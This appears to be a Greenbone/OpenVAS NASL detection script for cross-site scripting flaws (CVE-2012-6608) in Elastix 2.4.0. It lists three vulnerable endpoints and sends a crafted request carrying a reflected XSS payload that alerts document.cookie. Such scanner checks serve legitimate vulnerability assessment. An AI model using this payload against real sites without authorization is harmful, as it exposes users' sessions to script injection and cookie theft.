CPE = "cpe:/a:elastix:elastix";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803708" );
	script_version( "2021-03-22T11:05:50+0000" );
	script_cve_id( "CVE-2012-6608" );
	script_bugtraq_id( 56746 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-03-22 11:05:50 +0000 (Mon, 22 Mar 2021)" );
	script_tag( name: "creation_date", value: "2013-06-03 15:04:46 +0530 (Mon, 03 Jun 2013)" );
	script_name( "Elastix Multiple Cross-Site Scripting Vulnerabilities" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "gb_elastix_http_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "elastix/http/detected" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121832/elastix240-xss.txt" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/elastix-240-cross-site-scripting" );
	script_tag( name: "summary", value: "Elastix is prone to multiple cross site scripting
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the
  response." );
	script_tag( name: "insight", value: "Multiple flaws exist due to:

  - Input passed via the URL to '/libs/jpgraph/Examples/bar_csimex3.php/' is
  not properly sanitised before being returned to the user.

  - Input passed via the 'url' parameter to
  '/libs/magpierss/scripts/magpie_simple.php' is not properly sanitised
  before being returned to the user.

  - Input passed via the 'Page' parameter to 'xmlservices/E_book.php' is not
  properly sanitised before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers
  to execute arbitrary HTML and script code in a users browser session in context of an
  affected site and launch other attacks." );
	script_tag( name: "affected", value: "Elastix version 2.4.0 Stable and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one
  year since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/libs/magpierss/scripts/magpie_simple.php?url=\"><IMg+srC%3D+x+OnerRoR+%3D+alert(document.cookie)>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "OnerRoR = alert\\(document\\.cookie\\)>", extra_check: make_list( "Channel:",
	 "RSS URL:" ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

